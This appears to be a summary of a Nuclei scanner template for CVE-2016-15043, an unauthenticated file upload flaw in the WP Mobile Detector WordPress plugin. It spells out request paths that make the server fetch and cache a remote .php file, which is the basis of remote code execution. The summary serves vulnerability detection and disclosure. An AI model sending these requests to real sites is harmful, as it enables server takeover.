---
cve_id: CVE-2016-15043
template_path: nuclei-templates/http/cves/2016/CVE-2016-15043.yaml
affected_product: WP Mobile Detector
severity: critical
authentication: none
external_callback: true
affected_versions: <= 3.5
preconditions: WP Mobile Detector plugin installed on WordPress
poc_classification: rce
---

## Vulnerability

WP Mobile Detector is a WordPress plugin vulnerable to unrestricted file upload in versions <= 3.5. The vulnerability exists in `resize.php` due to missing file type validation when handling the `src` parameter. Unauthenticated attackers can upload arbitrary files (e.g., malicious PHP shells), potentially achieving remote code execution and full server compromise.

- **CVE**: CVE-2016-15043
- **CWE**: CWE-434
- **CVSS 3.1**: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Impact**: Full server compromise possible via RCE.

## PoC / Detection

Classification: rce

The template verifies exploitability through a two-step HTTP flow leveraging out-of-band interaction:

1. Issues a GET request to `/wp-content/plugins/wp-mobile-detector/resize.php?src=http://{{interactsh-url}}/{{rand}}.php`. This causes the server to fetch content from the attacker's interactsh URL and save it to the cache directory using the .php extension.
2. Follows up with a GET to `/wp-content/plugins/wp-mobile-detector/cache/{{filename}}` to confirm the file was successfully uploaded and is accessible, checking for HTTP 200 status and presence of `<body>` tags in the response body.

The OOB interaction (HTTP protocol) and content-type matching confirm processing of the malicious source.

## References

- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_mobile_detector_upload_execute.rb
- https://www.pluginvulnerabilities.com/2016/05/31/aribitrary-file-upload-vulnerability-in-wp-mobile-detector/
- https://wpscan.com/vulnerability/e4739674-eed4-417e-8c4d-2f5351b057cf/
